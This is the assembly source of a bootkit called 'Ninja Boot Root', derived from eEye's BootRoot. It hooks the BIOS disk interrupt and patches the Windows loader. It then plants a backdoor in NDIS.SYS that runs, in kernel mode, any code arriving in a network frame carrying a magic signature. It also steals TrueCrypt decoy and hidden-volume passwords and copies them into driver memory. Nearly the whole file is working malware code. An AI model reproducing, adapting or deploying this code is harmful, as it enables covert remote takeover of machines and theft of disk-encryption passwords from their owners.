;===============================================================
; nbrk.asm - Ninja Boot Root
;
; simplified as we DON'T run by BIOS, we run from a nice 
; purple_chain / true boot environment 8}
;
; added reentrance locking mechanism - since truecrypt calls   !
; an int 13h in its int 13h handler (!!)                       !
;
; v2: multiple sectors purple_chain boot
;     -> we are allready at protected 9800:0000,
;        with a stack setup
;     pass truecrypt passwords to ndis.sys
;===============================================================

; Based on:

;===============================================================
; eEye BootRoot v0.90 (NASM)           Last updated: 09/20/2005
;---------------------------------------------------------------
; Demonstration of the capabilities of custom boot sector code
; on a Windows NT-family system.
;
; * NASM-compatible version by Scott D. Tenaglia of mitre.org
;
; Derek Soeder - eEye Digital Security - 04/02/2005
;===============================================================

;
; To compile, use:  nasm -f bin -O 3 ebrknasm.asm
;

CPU 486

BOOTROOT_SIZE EQU 400h


;----------------
SEGMENT BRCODE16 ALIGN=1		; Defaults to PUBLIC, ALIGN=1 USE16
BITS 16

LBRCODE16_START EQU $

;
; Initialization
;

	; forward truecrypt passwords to patch_func ...
	mov		ds, ax
	
	push    cs
	pop		es
	
	mov		si, word [ds:08h] ; decoy password
	mov		cx, 16
	mov     di, tc_password_decoy
	rep		movsb

	mov		si, word [ds:0ah] ; hidden password
	mov		cx, 16
	rep		movsb

	; start normally
	xor		bx, bx
	push	bx
	pop		ds

	;
	; Install our INT 13h hook
	;
	cli

	mov		eax, [bx + (13h*4)]
	mov		[es:INT13HANDLER - LBRCODE16_START], eax	; store previous handler

	mov		word [bx + (13h*4)], LInt13Hook	; point INT 13h vector to our hook handler
	mov		[bx + (13h*4) + 2], es			; (BX = 0 from earlier)

	sti

	; back to purple_chain -> boot windows
	retf


;##################################
;##  INT 13h Hook Real-Mode ISR  ##
;##################################

LInt13Hook:

	pushf

	cmp		ah, 42h					; IBM/MS INT 13 Extensions - EXTENDED READ
	je		short LInt13Hook_ReadRequest

	cmp		ah, 02h					; DISK - READ SECTOR(S) INTO MEMORY
	je		short LInt13Hook_ReadRequest

immediate_exit:	
	popf
	
	db		0EAh					; JMP FAR INT13HANDLER
INT13HANDLER EQU $
	dd 0

MY_LOCK	db 0	
	
	
LInt13Hook_ReadRequest:

	; "locking mechanism" -> skip this request, when truecrypt int13h reentrance
	cmp byte [cs:MY_LOCK], 1
	jz immediate_exit

	mov byte [cs:MY_LOCK], 1 ; lock ourselves to know we are we

    mov byte [cs:INT13LASTFUNCTION], ah
	
	;
	; Invoke original handler to perform read operation
	;

	popf
	pushf								; push Flags because we're simulating an INT
	
	
	call		far [cs:INT13HANDLER]	; call original handler
	jc		   LInt13Hook_ret		; abort immediately if read failed

	
	
	pushf
	cli
	
	push		es
	push		ds
	pusha

	
	; ultra fancy boot animation .... :)))
	
	mov 		ax, 0a000h
	mov 		es, ax
	push		cs
	pop 		ds
	mov			si, ninja
	mov			di, (80-9)/2 + 80*100
	mov			dx, 20
.loopme:
	mov			cx, 9
	rep			movsb
	add			di, 80-9
	dec			dx
	jnz			.loopme

	popa
	pop		ds
	pop		es
	
	push	es
	pusha
	
	;
	; Adjust registers to internally emulate an AH=02h read if AH=42h was used
	;

	mov		ah, 00h
INT13LASTFUNCTION EQU $-1
	cmp		ah, 42h
	jne		short LInt13Hook_notextread
	
	cld
	lodsw
	lodsw							; +02h  WORD    number of blocks to transfer
	les		bx, [si]				; +04h  DWORD   transfer buffer
	
LInt13Hook_notextread:

	;
	; Scan sector for a signature of the code we want to modify
	;

	or		al, al
	jz		short LInt13Hook_scan_done
	
	cld

	mov		cl, al
	mov		al, 8Bh
	shl		cx, 9					; (AL * 200h)
	mov		di, bx

	
	
  LInt13Hook_scan_loop:
								; 8B F0       MOV ESI, EAX
								; 85 F6       TEST ESI, ESI
								; 74 21       JZ $+23h
								; 80 3D ...   CMP BYTE  [ofs32], imm8
								; (the first 6 bytes of this signature exist in other modules!)
								
								
	repne scasb
	jne		short LInt13Hook_scan_done

	cmp		dword  [es:di], 74F685F0h
	jne		short LInt13Hook_scan_loop

	cmp		word  [es:di+4], 8021h
	jne		short LInt13Hook_scan_loop

	
	mov		word  [es:di-1], 15FFh		; FFh/15h/xx/xx/xx/xx: CALL NEAR [ofs32]
	
	mov		eax, cs
	shl		eax, 4

	add		[cs:(NDISBACKDOOR_LINEAR - LBRPATCHFUNC32_START) + BRCODE16_SIZE], eax

	add		ax, (LPatchFunction - LBRPATCHFUNC32_START) + BRCODE16_SIZE
	mov		[cs:PATCHFUNC32_LINEAR], eax		; should be okay to add to AX, since we can't cross 1KB boundary

	add		ax, PATCHFUNC32_LINEAR - ((LPatchFunction - LBRPATCHFUNC32_START) + BRCODE16_SIZE)
	mov		[es:di+1], eax

LInt13Hook_scan_done:

	popa
	pop		es
	popf

LInt13Hook_ret:
	mov byte [cs:MY_LOCK], 0

	retf 2							; discard saved Flags from original INT (pass back CF, etc.)

ninja:
db 00000000b, 00000011b, 11111100b, 00000000b, 00000000b, 00000000b, 00000000b, 00000000b, 00000000b
db 00000000b, 00000000b, 00000011b, 00000000b, 00000000b, 00000000b, 11111100b, 00000000b, 00000000b
db 00000000b, 00000000b, 00000000b, 11111111b, 11111111b, 00111100b, 11000000b, 00000000b, 00000000b
db 00000000b, 00000000b, 00000000b, 00000011b, 11111111b, 11110000b, 00000000b, 00000000b, 00000000b
db 00000000b, 00000000b, 00000000b, 00000011b, 11111111b, 11110000b, 00000000b, 00000000b, 00000000b
db 00000000b, 00000000b, 00000000b, 00000011b, 11111111b, 11110000b, 00000000b, 00000000b, 00000000b
db 00000011b, 11110000b, 00000000b, 00000011b, 11111111b, 11000000b, 00000000b, 11110000b, 00000000b
db 00001111b, 00001100b, 00000000b, 00000000b, 11111111b, 11000000b, 00000000b, 00110000b, 00000000b
db 00111100b, 11111111b, 00000000b, 00000000b, 11111111b, 11000000b, 00111111b, 11001100b, 11000000b
db 00110011b, 11111111b, 11110000b, 00000000b, 00111111b, 00000000b, 11000000b, 00000000b, 00110000b
db 11001111b, 11111111b, 11111111b, 00000000b, 11111111b, 00000000b, 00000000b, 00110000b, 00001100b
db 00000011b, 11111111b, 11001111b, 11000000b, 11111111b, 00000011b, 00110000b, 00110011b, 00001100b
db 00000000b, 00000000b, 00000011b, 11000000b, 11111111b, 00000000b, 00110000b, 00000011b, 11000000b
db 00110000b, 00000000b, 00111100b, 11000000b, 11111111b, 11000000b, 00000000b, 00001100b, 00110000b
db 00111111b, 00001111b, 11110000b, 00000000b, 00111100b, 00000000b, 00110000b, 00110011b, 00001100b
db 00001111b, 11110000b, 00000000b, 00000000b, 11000011b, 00000000b, 11111111b, 11111111b, 00001100b
db 00001111b, 11111111b, 11111100b, 00000000b, 11000011b, 00000011b, 11111111b, 11111111b, 00001100b
db 00000011b, 11111111b, 11000000b, 00000000b, 00000000b, 00000011b, 11111111b, 11111111b, 11110000b
db 00000000b, 00000000b, 00000000b, 00000000b, 00000000b, 00000011b, 11111111b, 11111111b, 11000000b
db 00000000b, 00000000b, 00000000b, 00000000b, 00000000b, 00000000b, 00001111b, 11111100b, 00000000b
LBRCODE16_END EQU $

BRCODE16_SIZE EQU (LBRCODE16_END - LBRCODE16_START)

;----------------
SEGMENT BRPATCHFUNC32 ALIGN=1		; Default is PUBLIC ALIGN=1
BITS 32
	
LBRPATCHFUNC32_START EQU $


;################################################################
;##  NDIS.SYS!ethFilterDprIndicateReceivePacket Backdoor Code  ##
;################################################################

LNDISBackdoor:							; +00h  DWORD   'eBR\xEE' signature
								; +04h  [...]   code to execute (ESI points here on entry)
	pushfd
	pushad

	push		59h
	pop		ecx

	mov		esi, [esp+2Ch]				; ptr to some array of ptrs
	lodsd								; ptr to some structure
	mov		eax, [eax+8]				; ptr to an MDL for the packet
	cmp		dword  [eax+14h], ecx		; check size of packet
	jbe		LNDISBackdoor_ret

	add		ecx, [eax+0Ch]				; ptr to Ethernet frame
	cmp		dword  [ecx-4], 0EE524265h		; look for "eBR\xEE" signature at offset 55h in the frame
	jne		LNDISBackdoor_ret

	call		ecx

  LNDISBackdoor_ret:

	popad
	popfd

	push		ebp
	mov		ebp, esp
	sub		esp, 60h				; it doesn't matter if we allocate a little extra stack space

	db 0E9h							; E9h/xx/xx/xx/xx: JMP NEAR rel32
	; "JMP NEAR (ethFilterDprIndicateReceivePacket + 6)" 'rel32' will be manually appended here
	
LNDISBACKDOOR_END EQU $


;#####################################################
;##  Auxiliary RVA-to-Pointer Conversion Functions  ##
;#####################################################

LTranslateVirtualToRaw:

	pushad
	push		08h					; FIELD_OFFSET(IMAGE_SECTION_HEADER, VirtualSize)
	jmp		short LTranslate

LTranslateRawToVirtual:

	pushad
	push		10h					; FIELD_OFFSET(IMAGE_SECTION_HEADER, SizeOfRawData)

LTranslate:

	pop		eax

	test		word  [esi+20h], 0FFFh		; size of image (should be 4KB multiple if sections are aligned)
	jz		LTranslate_ret

	mov		esi, [ebx+3Ch]				; IMAGE_DOS_HEADER.e_lfanew
	add		esi, ebx				; ptr to PE header

	movzx		ecx, word  [esi+06h]			; IMAGE_NT_HEADERS.FileHeader.NumberOfSections
	movzx		edi, word  [esi+14h]			; IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
	lea		edi, [esi+edi+18h]			; IMAGE_FIRST_SECTION(ESI)

LTranslate_sectionloop:

	mov		edx, [esp+24h]				; function's stack "argument"

	sub		edx, [edi+eax+4]			; PIMAGE_SECTION_HEADER->{VirtualAddress,PointerToRawData}
	jb		short LTranslate_sectionloop_next

	cmp		edx, [edi+eax]				; PIMAGE_SECTION_HEADER->{VirtualSize,SizeOfRawData}
	jbe		short LTranslate_sectionloop_done

  LTranslate_sectionloop_next:

	add		edi, 28h
	loop		LTranslate_sectionloop

  LTranslate_sectionloop_done:

	xor		al, 1Ch					; 08h --> 14h, 10h --> 0Ch
	add		edx, [edi+eax]				; PIMAGE_SECTION_HEADER->{PointerToRawData,VirtualAddress}

	mov		[esp+24h], edx				; update stack "argument" to contain translated value

LTranslate_ret:

	popad
	ret


;#######################################
;##  Inline Code Patch Hook Function  ##
;#######################################

LPatchFunction:

	;
	; Initialization
	;

	pushfd
	pushad							; assume DS = ES = 10h (KGDT_R0_DATA: flat ring-0 data segment)

	cld

	;
	; Scan for address of module list base (_BlLoaderData)
	;

	mov		edi, [esp+24h]				; use EIP as a ptr into OSLOADER
	and		edi, ~000FFFFFh			; convert to image base ptr

	mov		al, 0C7h				; C7 46 34 00 40 00 00    MOV DWORD PTR [ESI+34h], 4000h

LPatchFunction_mlsigloop:					; assume that we will find it

	scasb
	jne		LPatchFunction_mlsigloop

	cmp		dword  [edi], 40003446h
	jne		LPatchFunction_mlsigloop

	mov		al, 0A1h				; A1 xx xx xx xx          MOV EAX, [xxxxxxxx]

LPatchFunction_mlbaseloop:

	scasb
	jne		LPatchFunction_mlbaseloop

	mov		esi, [edi]				; ptr to base of module list
	mov		esi, [esi]				; ptr to first node of module list
	mov		ebx, esi

	;
	; Search module list for NDIS.SYS
	;

LPatchFunction_modloop:

	mov		esi, [esi]
	cmp		esi, ebx
	jne		short LPatchFunction_modloop_nextnode	; break out if we've traversed the entire (circular) list

;----
LPatchFunction_done:

		;
		; Restore registers, perform displaced instructions, and return into patched code
		;

	popad
	popfd

	mov		esi, eax
	test		eax, eax
	jnz		short LPatchFunction_done_nojz

	pushfd
	add		dword  [esp+4], 21h
	popfd
LPatchFunction_done_nojz:

	ret
;----

LPatchFunction_modloop_nextnode:

	cmp		byte  [esi+2Ch], 8*2			; module file name 'UNICODE_STRING.Length' for L"NDIS.SYS"
	jne		short LPatchFunction_modloop

	mov		ecx, [esi+30h]
	mov		eax, [ecx]
	shl		eax, 8
	xor		eax, [ecx+4]
	and		eax, ~20202020h
	cmp		eax, 44534E49h				; "NDIS" mangled: 44004E00h ("N\0D\0" << 8) ^ 00530049h ("I\0S\0")
	jne		short LPatchFunction_modloop

	;
	; Search NDIS.SYS for ndisMLoopbackPacketX call to ethFilterDprIndicateReceivePacket
	;

 	mov		ebx, [esi+18h]				; EBX = image base address

	mov		edi, ebx
	mov		al, 50h				; 50                      PUSH EAX
								; 53                      PUSH EBX
								; C7 46 10 0E 00 00 00    MOV DWORD PTR [ESI+10h], 0Eh
								
								
;k00n:
;PAGENDSP:00025EB6 50                                push    eax             ; BugCheckParameter3
;PAGENDSP:00025EB7 53                                push    ebx             ; MemoryDescriptorList
;PAGENDSP:00025EB8 C7 46 10 0E 00 00+                mov     dword ptr [esi+10h], 0Eh
;PAGENDSP:00025EBF E8 5D CC 00 00                    call    sub_32B21

; =========== save ndis.sys image base ===
	push	ebx
	
LPatchFunction_nmlpxloop:

	scasb
	jne		LPatchFunction_nmlpxloop

	cmp		dword  [edi], 1046C753h
	jne		LPatchFunction_nmlpxloop

	cmp		dword  [edi+4], 0Eh
	jne		LPatchFunction_nmlpxloop

	lea		edx, [edi+0Dh]
	sub		edx, ebx

	push		edx
	call		LTranslateRawToVirtual
	pop		edx					; EDX = RVA of offset following CALL instruction
	
	add		edx, [edi+9]				; EDX += rel32

	push		edx
	call		LTranslateVirtualToRaw
	pop		edi					; EDI = ptr to start of eFDIRP in potentially raw image
	add		edi, ebx

	cmp		word  [edi], 0FF8Bh
	jne		LPatchFunction_no8BFF

	inc		edi
	inc		edx
	inc		edi
	inc		edx					; skip over "MOV EDI, EDI" at function start (XP SP2 and later)

LPatchFunction_no8BFF:

	mov		al, 0E9h				; E9h/xx/xx/xx/xx: JMP NEAR rel32
	stosb

	push		40h - 5					; RVA of destination (at 40h, inside DOS EXE code) - size of JMP
	pop		eax
	sub		eax, edx				; EAX (rel32) = destination RVA - source RVA
	stosd

	db		6Ah, (LNDISBACKDOOR_END - LNDISBackdoor)	; 6Ah/xx: PUSH simm8 (to keep MASM from being stupid)
	pop		ecx

	mov		esi, (LNDISBackdoor - LBRPATCHFUNC32_START) + BRCODE16_SIZE
NDISBACKDOOR_LINEAR EQU $-4

	lea		edi, [ebx+40h]
	rep movsb

	lea		eax, [edx+6 - (40h + (LNDISBACKDOOR_END - LNDISBackdoor) + 4)]
	stosd

	; ======== write truecrypt passwords into ndis.sys memory space
	pop		ebx
	mov		edi, ebx
	add		edi, 09a48h
	mov		ecx, 32

	call	me
me:	pop 	esi
	add 	esi, tc_password_decoy - me

.loopme:
	mov		al , [cs:esi]
	stosb
	inc		esi
	loop	.loopme
		
		
	jmp		LPatchFunction_done

tc_password_decoy  db 'here decoy pass', 0 
tc_password_hidden db 'here hdden pass', 0
	
LBRPATCHFUNC32_END EQU $

;----------------
SEGMENT BRDATA ALIGN=4			; Default is PUBLIC USE16

PATCHFUNC32_LINEAR EQU BOOTROOT_SIZE
dd 0